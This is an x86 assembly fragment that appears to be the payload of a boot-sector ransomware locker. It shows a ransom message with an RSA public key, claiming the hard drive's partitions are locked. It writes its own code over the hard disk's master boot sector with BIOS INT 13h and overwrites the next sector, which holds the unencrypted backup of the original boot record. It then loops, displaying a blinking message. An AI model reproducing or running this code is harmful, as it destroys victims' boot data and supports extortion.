CALL EndMessage ;push beginning location of data block onto stack
StartMessage
DB"Your Harddrive's partitions have been locked by order of:",13,10
db"the Chaqueur of Wasst",13,10
db"RSA(e, PQ): (3, 0x1CCD760221A623F127F5785BE110FD32994DC6E04D342A77E33BF49768F16789BBB6E59DA949513815DB5953985E31A6CFC30EFA35C7A51AEE78E05AA8A1971BDB844D87F73792DFA59BE5E89E9946A056316BEBCBF3C66A5370F0FC4829AA532935F7E5E91B30912DEFD1B300752027D2A24B1BCB658A3568E631E1F959A01B)",13,10
db"7 to 1 you'll solve your problems, but deface things first.",7 ;message to be displayed by rest of code
EndMessage:
pop bx ;retrieve bx from stack

mov bp,bx ;set bp as start of message

sub bx,3 ;set bx to start of sector
mov es,cs
mov ax,301h
mov dx,80h
mov cx,1
int 13h ;write out this sector to boot sector of HD

mov ax,301h
inc cx
int 13h ;destroy unencryped backup of original boot sector

MOV AX,3
INT 10h ; cls

MOV BX,8Fh ;set display colour to bright white, blinking
MOV CX,EndMessage - StartMessage ; set CL to end of messaage
MOV DX,0; set location to top left

KeyPressed:
	MOV AX,1300h
	add bl,2
	and bl,8fh ;shift between colour 1 and 15 counting by 2s on a black background - always blinking.
	INT 10h ;display message

	MOV AH,0
	INT 16h ; pause until key pressed
jmp KeyPressed
